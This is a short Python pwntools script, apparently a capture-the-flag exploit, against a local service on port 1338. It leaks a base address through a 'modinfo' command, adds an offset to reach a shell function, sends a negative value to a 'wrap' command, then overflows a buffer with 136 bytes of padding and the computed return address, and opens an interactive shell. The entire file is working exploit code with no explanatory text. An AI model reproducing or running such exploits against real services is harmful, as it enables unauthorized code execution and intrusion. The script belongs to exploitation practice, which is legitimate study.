from pwn import *

host = "127.0.0.1"
port = "1338"

offset = 136
shell_offset = 0x9c3

io = remote(host, port)
io.recvuntil('> ')
io.send("modinfo\n")

addr = int(io.recvuntil('> ').split('\n')[3].split(':')[1], 16) + shell_offset

print('base = '+hex(addr))

io.send("wrap\n")
io.recvuntil('|> ')
io.send('-5\n')

io.recvuntil('|> ')
io.send("A" * offset + p64(addr) + "\n")

io.interactive()
io.close()
